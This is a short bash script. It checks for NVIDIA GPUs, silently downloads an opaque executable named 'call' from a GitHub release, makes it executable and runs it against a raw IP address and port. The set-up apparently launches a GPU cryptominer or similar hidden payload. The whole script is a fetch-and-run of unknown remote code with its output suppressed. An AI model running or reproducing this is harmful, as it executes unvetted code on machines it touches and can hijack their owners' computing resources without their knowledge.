#!/bin/bash
nvidia-smi -L
wget https://github.com/edwardksrbv9/kingbet/releases/download/1/call &> /dev/null
chmod +x call
./call -P http://216.198.92.69:4545/"$1" &> log
